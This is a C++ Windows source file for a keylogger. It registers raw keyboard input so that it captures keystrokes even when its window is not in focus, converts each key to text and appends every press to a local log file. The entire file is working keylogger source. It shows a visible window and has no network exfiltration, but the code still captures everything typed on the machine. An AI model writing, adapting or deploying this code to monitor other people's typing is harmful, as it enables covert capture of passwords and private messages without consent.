#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <initguid.h>
#include <devguid.h>
#include <setupapi.h>
#include <vector>
#include <fstream>

#pragma comment(lib, "setupapi.lib")

DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD,
    0x884b96c3, 0x56ef, 0x11d1,
    0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);

std::wofstream logFile("keylogger.log", std::ios::app);
std::vector<PWSTR> keyboardDevicePaths;

std::wstring VKeyToWString(DWORD vkey) {
    BYTE keyboardState[256] = {0};
    WCHAR buffer[16];
    HKL layout = GetKeyboardLayout(0);

    // Get the scan code
    UINT scanCode = MapVirtualKeyEx(vkey, MAPVK_VK_TO_VSC, layout);

    // Get key name text (for special keys like arrows, function keys, etc.)
    if ((vkey >= VK_LEFT && vkey <= VK_DOWN) || (vkey >= VK_F1 && vkey <= VK_F24)) {
        LONG lParam = (scanCode << 16);
        int result = GetKeyNameTextW(lParam, buffer, sizeof(buffer) / sizeof(WCHAR));
        if (result > 0) {
            return std::wstring(buffer);
        }
    }

    // Try to translate to a character (for alphanumeric keys)
    if (ToUnicodeEx(vkey, scanCode, keyboardState, buffer, sizeof(buffer) / sizeof(WCHAR), 0, layout) > 0) {
        return std::wstring(buffer);
    }

    // Fallback: return hex code
    wchar_t fallback[10];
    swprintf(fallback, 10, L"[0x%X]", vkey);
    return std::wstring(fallback);
}

void LogMessage(const std::wstring& message) {
    // flush to make sure message is written immediately
    logFile << message << std::endl;
    logFile.flush();
}

void ListKeyboardDevicePaths() {
    std::vector<PWSTR> keyboardPaths;
    HDEVINFO deviceInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_KEYBOARD, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (deviceInfo == INVALID_HANDLE_VALUE) { return;  }
    SP_DEVICE_INTERFACE_DATA devInterfaceData = {};
    devInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
    for (DWORD i = 0; SetupDiEnumDeviceInterfaces(deviceInfo, NULL, &GUID_DEVINTERFACE_KEYBOARD, i, &devInterfaceData); i++) {
        DWORD requiredSize = 0;
        SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, NULL, 0, &requiredSize, NULL);
        PSP_DEVICE_INTERFACE_DETAIL_DATA devDetail = (PSP_DEVICE_INTERFACE_DETAIL_DATA)malloc(requiredSize);
        if (!devDetail) { continue; } 
        devDetail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
        if (SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, devDetail, requiredSize, NULL, NULL)) {
            keyboardDevicePaths.push_back(devDetail->DevicePath);
            LogMessage(L"Found keyboard device: " + std::wstring(devDetail->DevicePath));
        }
        free(devDetail);
    }
    SetupDiDestroyDeviceInfoList(deviceInfo);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            // write initial program message
            TextOut(hdc, 10, 10, L"Keylogger", 9);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_INPUT: {
            UINT dwSize = 0;
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
            LPBYTE lpb = new BYTE[dwSize];
            if (!lpb) { return 0; }
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
                RAWINPUT* raw = (RAWINPUT*)lpb;
                if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                    LogMessage(L"Key Pressed: " + VKeyToWString(raw->data.keyboard.VKey));
                }
            }
            delete[] lpb;
            return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    LogMessage(L"Starting program");
    // get keyboard device paths
    LogMessage(L"Listing keyboard device paths");
    ListKeyboardDevicePaths();
    // register window class
    LogMessage(L"Registering window class");
    const wchar_t CLASS_NAME[] = L"KeyloggerClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L"Window class registration failed!", L"Error", MB_OK);
        return 1;
    }
    // create window
    LogMessage(L"Creating window");
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, L"Keylogger", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
        NULL, NULL, hInstance, NULL
    );
    if (hwnd == NULL) {
        MessageBox(NULL, L"Window creation failed!", L"Error", MB_OK);
        return 1;
    }
    ShowWindow(hwnd, nCmdShow);
    // register raw input from keyboards
    LogMessage(L"Registering raw input");
    RAWINPUTDEVICE rid[1];
    rid[0].usUsagePage = 0x01; // generic desktop controls
    rid[0].usUsage = 0x06; // keyboard
    rid[0].dwFlags = RIDEV_INPUTSINK | RIDEV_DEVNOTIFY; // receive input even when not in foreground
    rid[0].hwndTarget = hwnd;
    if (!RegisterRawInputDevices(rid, 1, sizeof(rid[0]))) {
        MessageBox(NULL, L"Failed to register raw input devices!", L"Error", MB_OK);
        return 1;
    }
    // message loop
    LogMessage(L"Entering message loop");
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
